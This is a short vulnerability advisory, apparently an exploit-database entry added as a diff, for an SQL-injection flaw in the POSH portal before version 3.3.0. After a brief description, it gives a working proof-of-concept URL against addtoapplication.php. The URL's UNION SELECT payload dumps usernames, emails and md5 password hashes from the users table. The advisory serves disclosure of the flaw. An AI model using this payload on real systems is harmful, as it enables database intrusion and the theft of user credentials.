@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/65817/info
+
+POSH is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied input.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Versions prior to POSH 3.3.0 are vulnerable. 
+
+http://www.example.com/portal/addtoapplication.php?pid=0&rssurl=url,nbvariables,defvar%20FROM%20dir_item,dir_cat_item
+%20WHERE%201=0%20UNION%20SELECT%201,2,3,4,5,6,(select%20group_concat(username,':',email,':',md5pass)%20from%20users),8%23 
